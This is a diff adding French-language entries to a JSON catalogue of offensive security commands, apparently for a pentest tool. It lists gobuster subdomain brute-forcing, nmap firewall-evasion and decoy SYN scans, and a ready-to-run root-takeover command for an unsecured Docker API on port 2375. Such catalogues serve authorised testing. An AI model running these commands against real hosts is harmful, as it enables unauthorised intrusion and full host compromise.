+      "name": "Gobuster — brute-force sous-domaines DNS",
+      "short_name": "gobuster dns",
+      "description": "Énumère les sous-domaines via brute-force DNS",
+      "command": "gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50",
+      "purpose": "Découvrir des sous-domaines cachés ou oubliés",
+      "expected_output": "Found: dev.DOMAIN, Found: staging.DOMAIN",
+      "risks": "Moyen — générer du trafic DNS inhabituel",
+      "prerequisites": [
+        "gobuster installé",
+        "SecLists installé"
+      ],
+      "tool_required": "gobuster",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "dns",
+        "subdomain",
+        "bruteforce",
+        "recon"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_040",
+      "name": "Nmap — détection IDS/firewall",
+      "short_name": "nmap fw detect",
+      "description": "Détecte présence firewall/IDS via ACK scan et fragmentation",
+      "command": "sudo nmap -sA -T2 --mtu 16 -f $TARGET",
+      "purpose": "Identifier la présence et les règles d'un firewall sur la cible",
+      "expected_output": "filtered / unfiltered par port — indique présence firewall",
+      "risks": "Élevé — scan de contournement, clairement offensif",
+      "prerequisites": [
+        "nmap installé"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": true,
+      "tags": [
+        "firewall",
+        "ids",
+        "evasion",
+        "nmap",
+        "stealth"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_041",
+      "name": "Nmap — scan SYN stealth",
+      "short_name": "nmap syn stealth",
+      "description": "Scan SYN furtif sans compléter la connexion TCP",
+      "command": "sudo nmap -sS -T2 --randomize-hosts -D RND:10 $TARGET",
+      "purpose": "Scanner discrètement en évitant les connexions complètes loggées",
+      "expected_output": "PORT STATE SERVICE",
+      "risks": "Élevé — utilise des leurres IP aléatoires, clairement offensif",
+      "prerequisites": [
+        "nmap installé"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": true,
+      "tags": [
+        "stealth",
+        "syn",
+        "decoy",
+        "evasion",
+        "nmap"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "rec_042",
+      "name": "Docker daemon — RCE via API exposée",
+      "short_name": "docker api rce",
+      "description": "Crée un conteneur avec bind-mount / pour obtenir root sur l'hôte",
+      "command": "curl -s http://$TARGET:2375/images/json && docker -H tcp://$TARGET:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh",
+      "purpose": "Exploiter un Docker daemon sans TLS pour rooter l'hôte",
+      "expected_output": "# whoami → root — dans le chroot de l'hôte",
+      "risks": "Critique — accès root complet à l'hôte via escape de conteneur",
+      "prerequisites": [
+        "Docker daemon sur TCP 2375 sans TLS"
+      ],
+      "tool_required": "docker",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "docker",
+        "rce",
+        "container",
+        "escape",
+        "root"
+      ],
+      "execution_policy": "normal"
+    }
+  ]
+}
